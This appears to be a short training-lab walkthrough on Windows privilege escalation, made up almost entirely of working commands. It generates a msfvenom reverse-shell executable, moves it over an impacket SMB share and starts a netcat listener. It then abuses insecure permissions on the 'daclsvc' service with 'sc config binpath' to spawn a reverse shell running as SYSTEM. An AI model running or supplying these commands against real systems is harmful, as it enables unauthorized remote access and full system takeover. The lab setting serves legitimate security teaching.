### Generating a Reverse Shell Executable

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:
```JavaScript
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfer using SMB server. On Kali, in the same directory as reverse.exe
```JavaScript
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On Windows (update the IP address with your Kali IP)
```JavaScript
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Setup netcat listener on Kali
```JavaScript
sudo nc -nvlp 53
```

Run reverse.exe on Windows
```JavaScript
C:\PrivEsc\reverse.exe
```


### Insecure Service Permissions

Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```JavaScript
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
```JavaScript
sc qc daclsvc
```

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
```JavaScript
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```JavaScript
net start daclsvc
```
